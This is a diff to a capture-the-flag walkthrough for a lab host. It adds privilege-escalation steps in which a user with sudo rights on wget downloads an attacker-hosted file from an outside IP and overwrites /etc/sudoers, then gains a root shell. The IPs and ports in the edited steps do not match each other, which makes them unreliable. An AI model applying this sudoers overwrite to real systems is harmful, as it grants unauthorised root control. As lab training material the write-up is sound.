@@ -266,13 +266,38 @@ jessie  ALL=(root) NOPASSWD: /usr/bin/wget
 jessie  ALL=(ALL) NOPASSWD: ALL
 ```
 
+- Open port with ```py3``` so that jessie shell can run ```wget``` on us:
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
 - After saving it we will ```wget``` and replace ```sudoers```
 ```bash
 #move to etc for easy access
 cd /etc
 
 #wget and replace
-sudo /usr/bin/wget 10.10.91.4:9001/badsudo --output-document=sudoers
+sudo /usr/bin/wget 10.10.91.4:9001/sudoer --output-document=sudoers
 ```
 
+- you should get this at Jessie shell:
+```
+jessie@CorpOne:/etc$ sudo /usr/bin/wget 10.10.148.110:80/sudoers --output-document=sudoers
+--2020-04-24 15:40:57--  http://10.10.148.110/sudoers
+Connecting to 10.10.148.110:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 813 [application/octet-stream]
+Saving to: ‘sudoers’
+
+sudoers            100%[===============>]     813  --.-KB/s    in 0s      
+
+2020-04-24 15:40:57 (168 MB/s) - ‘sudoers’ saved [813/813]
+```
+
+13. now run ```sudo su``` and you will gain a root shell!
+```
+jessie@CorpOne:/etc$ sudo su
+root@CorpOne:/etc# 
+```
 
